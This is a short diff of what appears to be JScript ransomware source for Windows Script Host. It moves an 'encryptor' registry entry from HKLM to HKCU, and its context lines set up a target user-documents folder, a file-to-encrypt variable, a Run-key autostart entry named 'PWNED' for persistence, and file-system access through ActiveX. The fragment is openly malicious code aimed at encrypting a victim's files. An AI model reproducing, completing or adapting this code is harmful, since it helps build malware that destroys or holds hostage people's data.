@@ -3,7 +3,7 @@ var base64={};base64.PADCHAR='=';base64.ALPHA='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefg
 //
 var encryptor;
 var personalFolderRegistryEntry = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Personal';
-var encryptorRegistryEntry = 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\e';
+var encryptorRegistryEntry = 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\e';
 var fileNameToEncryptVar = 'fileNameToEncrypt';
 var processFlagReg = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\PWNED';
 var fso = new ActiveXObject('Scripting.FileSystemObject');
